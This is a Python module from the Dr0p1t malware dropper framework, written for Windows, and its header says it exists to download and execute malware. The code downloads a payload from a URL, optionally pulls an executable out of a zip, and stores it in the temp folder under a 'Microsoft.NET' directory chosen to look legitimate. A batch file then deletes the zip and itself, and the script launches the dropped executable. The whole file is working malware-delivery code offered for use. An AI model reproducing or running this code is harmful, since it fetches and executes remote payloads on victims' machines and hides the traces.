#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to download and execute your malware (¯\_(ツ)_/¯)
#Start

global pthhhh
from platform import architecture
def fire_things_up(url,arch=False,zip=False):
	global pthhhh
	def work(zip):
		global pthhhh
		pthhhh = get_output("echo %temp%").strip()
		CHUNK  = 16 * 1024
		junk   = b""
		if not zip:
			res = urlopen(url)
			while True:
				chunk = res.read(CHUNK)
				if chunk:
					junk +=chunk
				else:break
			f   = open(pthhhh+"\\library.exe", 'wb')
			f.write(junk)
			f.close()
			xx     = subprocess.Popen( 'mkdir Microsoft.NET >> NUL',shell=True,cwd=pthhhh)
			subprocess.Popen( 'move library.exe Microsoft.NET\\library.exe >> NUL',shell=True,cwd=pthhhh)
		elif zip:
			res = urlopen(url)
			while True:
				chunk = res.read(CHUNK)
				if chunk:
					junk +=chunk
				else:break
			##~Import-Here~##
			f   = open(pthhhh+"\\library_data.zip", 'wb')
			f.write(junk)
			f.close()
			xx     = subprocess.Popen( 'mkdir Microsoft.NET >> NUL',shell=True,cwd=pthhhh)
			subprocess.Popen( 'move library_data.zip Microsoft.NET\\library_data.zip >> NUL',shell=True,cwd=pthhhh)
			zip=zipfile.ZipFile(pthhhh+"\\Microsoft.NET\\library_data.zip")
			def get_exe_from(zip):
				for i in zip.namelist():
					if i.endswith(".exe"):
						return i
			f = open(pthhhh+"\\Microsoft.NET\\library.exe","wb")
			f.write( zip.read( get_exe_from(zip) ) )
			f.close()
			bat_data = '''@echo off\nbreak>library_data.zip\nDEL -f "library_data.zip"\nbreak>"%~f0" && DEL "%~f0" '''
			bat = open(pthhhh+"\\Microsoft.NET\\lolz_service.bat","w");bat.write(bat_data);bat.close()
			xxx = subprocess.Popen( pthhhh+"\\Microsoft.NET\\lolz_service.bat >> NUL",shell=True)

		#xx  = subprocess.Popen( "library.exe >> NUL",shell=True,cwd=pthhhh+"\\Microsoft.NET")
		#xxx = subprocess.Popen( 'attrib +s +h "Microsoft.NET" >> NUL',shell=True,cwd=pthhhh)
	#check architecture
	if arch:
		if architecture()[0][:2] == arch: work(zip)
	else: work(zip)

#Someshit
xx  = subprocess.Popen( "Microsoft.NET\\library.exe >> NUL",shell=True,cwd=pthhhh)
